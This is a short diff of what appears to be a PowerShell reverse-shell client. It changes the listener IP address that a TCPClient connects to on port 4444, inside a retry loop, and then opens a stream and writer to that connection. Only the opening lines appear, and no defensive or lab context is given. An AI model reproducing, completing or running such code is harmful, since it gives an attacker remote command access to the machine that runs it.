@@ -1,7 +1,7 @@
 do {
     try {
         # Attempt to connect to the listener
-        $client = New-Object System.Net.Sockets.TCPClient("172.20.10.7", 4444)
+        $client = New-Object System.Net.Sockets.TCPClient("192.168.1.0", 4444)
         if ($client.Connected) {
             $stream = $client.GetStream()
             $writer = New-Object System.IO.StreamWriter($stream)
